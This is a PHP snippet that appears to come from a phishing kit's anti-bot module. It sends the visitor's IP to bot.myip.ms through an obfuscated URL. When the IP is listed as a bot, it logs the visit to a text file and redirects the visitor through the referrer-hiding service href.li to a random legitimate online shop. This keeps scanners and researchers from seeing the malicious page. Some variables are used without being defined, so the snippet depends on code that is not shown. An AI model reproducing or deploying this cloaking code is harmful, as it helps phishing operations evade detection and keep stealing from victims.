<?php
$random_id = sha1(rand(0,1000000));
$randomlink = array(
"https://href.li/?https://www.danicathreesixty.com",
"https://href.li/?https://www.thegldshop.com",
"https://href.li/?https://704-shop.myshopify.com",
"https://href.li/?https://corgi-overload-store.myshopify.com",
"https://href.li/?https://www.cubowl.com",
"https://href.li/?https://cache.google.com",
"https://href.li/?http://212.142.160.199",
"https://href.li/?https://woolman.io",
"https://href.li/?https://store.lilbub.com",
"https://href.li/?https://www.davdev9.com",
"https://href.li/?https://shop-demure.com",
"https://href.li/?https://www.elevenmadisonpark.store",
"https://href.li/?https://faktr-store.com",
"https://href.li/?https://www.wanderlust.store");
$random = rand(0, 11);
$randomlink = $randomlink[$random];
$getfile = file_get_contents(urldecode('http%3A%2F%2Fbot.myip.ms%2F').$ip.'');
$_SESSION['9FKXXXX'] = $getfile;
if(!strpos($_SESSION['9FKXXXX'],"Not Listed")){
$data = 'Ok : '.$country.' / ('.$TIME_DATE.') |IP : '.$ip;
file_put_contents('./s/Bakayooorat.txt', $data.PHP_EOL, FILE_APPEND);
header("Location: $randomlink");
exit();
}
?>